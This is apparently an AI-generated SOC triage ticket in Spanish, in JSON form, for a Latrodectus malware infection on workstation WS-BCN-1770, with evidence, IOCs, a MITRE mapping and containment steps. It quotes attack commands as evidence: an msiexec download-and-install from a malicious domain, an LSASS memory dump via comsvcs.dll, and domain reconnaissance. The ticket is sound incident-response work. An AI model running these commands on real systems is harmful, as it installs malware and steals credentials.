@@ -1,0 +1,194 @@
+{
+  "ticket_id": "TICKET-20261009-WSCRIP-WS-BCN-1770",
+  "alert_ids": [
+    "ALR-20261009-011791"
+  ],
+  "title": "Malware Latrodectus con ejecución confirmada, persistencia, C2, robo de credenciales (LSASS) y movimiento lateral en WS-BCN-1770",
+  "verdict": "true_positive",
+  "confidence": 0.98,
+  "severity": "critical",
+  "severity_rationale": "Regla UC-EDR-001 severidad `high` × criticidad del activo WS-BCN-1770 (`Media`) = `high` base. Ajuste **+1** por ejecución confirmada de código malicioso (no solo intento), persistencia establecida, robo de credenciales (dump de LSASS) y movimiento lateral con cuenta privilegiada (se aplica un único ajuste según sección 2). EDR action = `detected_only` → no hubo bloqueo, y hay abundante actividad posterior → no aplica ajuste `−1`. Resultado: `high` + 1 = `critical`.",
+  "affected": {
+    "users": [
+      "marta.puig@tarvia.example (U1770, Compradora Senior, no privilegiada, no VIP; su puesto NO corresponde a este tipo de actividad)",
+      "adm.aortega@tarvia.example (U1443A, cuenta administrada/privilgiada de Alba Ortega — 'solo debe usarse desde JUMP01'; usada para movimiento lateral desde un equipo comprometido)"
+    ],
+    "hosts": [
+      "WS-BCN-1770 (10.10.3.95) — A00770, portátil Windows 11, criticidad Media, zona HQ-USERS, EDR instalado. Puesto comprometido.",
+      "FS01 — host destino del servicio PSEXESVC instalado desde WS-BCN-1770 (positional compromiso / movimiento lateral). Verificar."
+    ],
+    "business_services": [
+      "Puesto de trabajo (Compras)",
+      "Servidor de archivos (FS01, a verificar)"
+    ],
+    "customers": [
+      "marta.puig",
+      "adm.aortega (cuentas expuestas por el dump de LSASS)"
+    ]
+  },
+  "summary": "Cadena de ataque completa y activa contra WS-BCN-1770: un archivo JS descargado (`Pedido_Q4_2026.js`, Downloads) fue ejecutado por `wscript.exe`, lo que lanzó `msiexec.exe` para descargar un instalador desde `aplihartom.com` (dominio C2 Latrodectus confirmado por TIP), dropeó y ejecutó `upd_x64.dll` (DLL sin firma, Latrodectus loader, TIP malicioso), estableció persistencia mediante la clave de registro `HKCU\\...\\Run\\Update`, beaconneó contra el C2 `203.0.113.88` (RU) vía proxy con respuestas 200/allowed, realizó reconocimiento del dominio (net/nltest/adf.exe) y volcó LSASS (comsvcs.dll MiniDump → `l.dmp`) como SYSTEM para robo de credenciales, y finalmente ejecutó PsExec hacia FS01 con la cuenta privilegiada adm.aortega. El EDR actuó como `detected_only` (sin bloqueo). No existe cambio aprobado ni actividad autorizada que lo justifique.",
+  "evidence": [
+    {
+      "source": "edr_events",
+      "event_id": "EDR-0123400",
+      "finding": "Ejecución inicial: wscript.exe ejecuta `C:\\Users\\marta.puig\\Downloads\\Pedido_Q4_2026\\Pedido_Q4_2026.js`, padre explorer.exe, usuario marta.puig. Sin TIP para el hash del JS (6f395de6...): desconocido, no se descarta."
+    },
+    {
+      "source": "edr_events",
+      "event_id": "EDR-0123401",
+      "finding": "Descarga maliciosa confirmada: msiexec.exe /q /i https://aplihartom.com/dl/upd.msi, padre wscript.exe. Dominio `aplihartom.com` = Latrodectus (C2/loader, TIP conf 85, malicioso)."
+    },
+    {
+      "source": "edr_events",
+      "event_id": "EDR-0123402",
+      "finding": "Dropper: msiexec crea `upd_x64.dll` en `AppData\\Roaming\\Custom_update\\` con hash 0cfa0bdd... (sin firma). TIP: Latrodectus loader, conf 75, malicioso."
+    },
+    {
+      "source": "edr_events",
+      "event_id": "EDR-0123403",
+      "finding": "Ejecución del binario malicioso: rundll32.exe carga `upd_x64.dll`, padre msiexec (pid 8344)."
+    },
+    {
+      "source": "edr_events",
+      "event_id": "EDR-0123404",
+      "finding": "Persistencia confirmada: registry_set `HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Update` apuntando al DLL malicioso."
+    },
+    {
+      "source": "proxy",
+      "event_id": "PRX-0211359..PRX-02114xx (truncado)",
+      "finding": "C2 beaconing confirmado: ~60+ POST a https://aplihartom.com/live/ desde 10.10.3.95 (WS-BCN-1770) hacia 203.0.113.88 (RU, Latrodectus C2, TIP conf 80, bulletproof hosting), status 200, action allowed, intervalo ~60 s. `bytes_out` > `bytes_in` en cada Beacon. NO hubo 403 ni bloqueo."
+    },
+    {
+      "source": "edr_events",
+      "event_id": "EDR-0123405..EDR-0123411",
+      "finding": "Reconocimiento post-explotación bajo el proceso malicioso (pid 8344): `whoami /all`, `net group \"Domain Admins\" /domain`, `nltest /dclist:tarvia.local`, `net view /all /domain`, `net share`, `adf.exe` (enumeración de ordenadores AD), `net group \"Enterprise Admins\" /domain`."
+    },
+    {
+      "source": "edr_events",
+      "event_id": "EDR-0123412",
+      "finding": "Robo de credenciales confirmado: `rundll32.exe comsvcs.dll, MiniDump 708 C:\\ProgramData\\l.dmp full` sobre `lsass.exe` (pid 708) ejecutado como NT AUTHORITY\\SYSTEM."
+    },
+    {
+      "source": "edr_events",
+      "event_id": "EDR-0123413",
+      "finding": "Movimiento lateral confirmado: servicio PSEXESVC instalado en FS01 (user TARVIA\\adm.aortega), `remote_host` = WS-BCN-1770. adm.aortega es cuenta privilegiada que según la política de empresa solo debe usarse desde JUMP01; PsExec proviene del equipo comprometido, no de JUMP01. No hay cambio aprobado para adm.aortega."
+    }
+  ],
+  "enrichment": [
+    {
+      "indicator": "aplihartom.com",
+      "type": "domain",
+      "source": "Tarvia TIP",
+      "result": "malicious — Latrodectus (c2, loader), conf 85."
+    },
+    {
+      "indicator": "203.0.113.88",
+      "type": "ip",
+      "source": "Tarvia TIP",
+      "result": "malicious — Latrodectus (c2, loader), conf 80; RU/Moscú, bulletproof hosting."
+    },
+    {
+      "indicator": "0cfa0bdd1f21ae4d71ab3b0978339be3bd578b9c0c6bf3eeeffed4a0ca3dd697",
+      "type": "sha256",
+      "source": "Tarvia TIP",
+      "result": "malicious — Latrodectus loader, conf 75."
+    },
+    {
+      "indicator": "6f395de68a4888c4f7ac579e3a8a844f4b1dd89db7b97274ca346af0ac67b466",
+      "type": "sha256",
+      "source": "Tarvia TIP",
+      "result": "sin datos (desconocido). No es 'limpio por defecto'; se considera sospechoso por contexto."
+    },
+    {
+      "indicator": "WS-BCN-1770",
+      "type": "asset",
+      "source": "CMDB",
+      "result": "A00770, portátil Win11, criticidad Media, zona HQ-USERS, EDR instalado."
+    },
+    {
+      "indicator": "marta.puig",
+      "type": "user",
+      "source": "Directorio",
+      "result": "no privilegiada, no VIP, estándar. Su perfil (Compras) no justifica esta actividad."
+    },
+    {
+      "indicator": "adm.aortega",
+      "type": "user",
+      "source": "Directorio",
+      "result": "cuenta administrada/privilgiada; 'solo debe usarse desde JUMP01'."
+    },
+    {
+      "indicator": "cambios",
+      "type": "authorization",
+      "source": "consultar_cambios",
+      "result": "sin cambios aprobados ni ejercicios autorizados para WS-BCN-1770 ni adm.aortega."
+    }
+  ],
+  "mitre": [
+    "T1204.002 (Malicious File)",
+    "T1218.011 (rundll32)",
+    "T1547.001 (Run Keys)",
+    "T1071 (C2)",
+    "T1082/T1057 (System Info Recon)",
+    "T1083 (File/Directory Discovery)",
+    "T1003.001 (LSASS Memory Dump)",
+    "T1021.002 (PsExec Lateral Movement)"
+  ],
+  "recommended_actions": [
+    {
+      "action": "ESCALADO INMEDIATO a N2 por teléfono (SLA critical 15 min) y notificar al responsable SOC y CISO por severidad critical / true_positive confirmado.",
+      "target": "n2_guardia",
+      "requires_approval": false,
+      "justification": "Sección 5 (escalado obligatorio): ejecución de código malicioso, robo de credenciales y movimiento lateral con cuenta privilegiada."
+    },
+    {
+      "action": "Proponer AISLAMIENTO de WS-BCN-1770 de la red (N2 aprueba; es un Puesto de trabajo, no OT).",
+      "target": "n2",
+      "requires_approval": true,
+      "justification": "Equipo con C2 activo, persistencia yLSASS dump en curso."
+    },
+    {
+      "action": "Bloquear IOCs en proxy/correo/EDR: dominios/aplihartom.com y su C2 203.0.113.88, y el hash 0cfa0bdd1f21ae4d71ab3b0978339be3bd578b9c0c6bf3eeeffed4a0ca3dd697 (upd_x64.dll) y 6f395de6... (Pedido_Q4_2026.js). No bloquear a nivel global servicios legítimos de uso dual (mega.nz/AnyDesk).",
+      "target": "proxy, correo, edr",
+      "requires_approval": false,
+      "justification": "N1 puede ejecutar bloqueo de IOC (sección 4)."
+    },
+    {
+      "action": "Proponer (N2) revocar sesiones y FORZAR CAMBIO DE CONTRASEÑA de las cuentas expuestas por el dump de LSASS: marta.puig y, especialmente, adm.aortega (cuenta privilegiada). Verificar que ninguna sesión de adm.aortega se use desde JUMP01; descartar uso legítimo.",
+      "target": "n2",
+      "requires_approval": true,
+      "justification": "Robo de credenciales confirmado (LSASS dump)."
+    },
+    {
+      "action": "Investigar FS01 (host destino del PsExec): confirmar si hubo ejecución del servicio, listar sesiones activas de adm.aortega y revisar si el servidor fue comprometido; revisar si FS01 contiene datos de clientes/pagos (prioridad sección 21).",
+      "target": "n2 + dueño del servicio",
+      "requires_approval": true,
+      "justification": "Movimiento lateral a servidor confirmado."
+    },
+    {
+      "action": "Recopilar y aislar el dump C:\\ProgramData\\l.dmp para análisis forense; ampliar la búsqueda de cuentas del dominio expuestas.",
+      "target": "forense",
+      "requires_approval": false,
+      "justification": "Preservar evidencia del robo de credenciales."
+    },
+    {
+      "action": "Revisar si existe una segunda alerta (por ejemplo, PsExec/movimiento lateral en FS01 o cuenta administrada desde puesto) y AGRUPARla a este mismo ticket según sección 6.",
+      "target": "soc",
+      "requires_approval": false,
+      "justification": "La cadena incluye FS01; debe documentarse en un único ticket."
+    }
+  ],
+  "escalation": {
+    "escalate": true,
+    "to": "N2 de guardia",
+    "reason": "true_positive critical: ejecución confirmada de código malicioso (Latrodectus), persistencia (Run key), robo de credenciales (dump de LSASS como SYSTEM) y movimiento lateral con cuenta privilegiada (PsExec a FS01 con adm.aortega desde equipo comprometido). Requiere escalado a N2 por teléfono dentro del SLA de 15 min (sección 3)."
+  },
+  "open_questions": [
+    "¿Se ha exfiltrado efectivamente contenido y de qué recursos? (Los logs de proxy muestran `bytes_out` > `bytes_in`, sugiriendo salida de datos, pero no se puede cuantificar por truncamiento).",
+    "¿Se ejecutó con éxito el servicio PSEXESVC en FS01 y está este comprometido?",
+    "¿Otros usuarios han iniciado sesión en WS-BCN-1770 (no verificado en este triaje)?",
+    "El hash del JS (6f395de6...) no tiene datos en el TIP; se sugiere subcarlo a sandbox externo."
+  ],
+  "executed_actions": [],
+  "triage_seconds": 111.03
+}
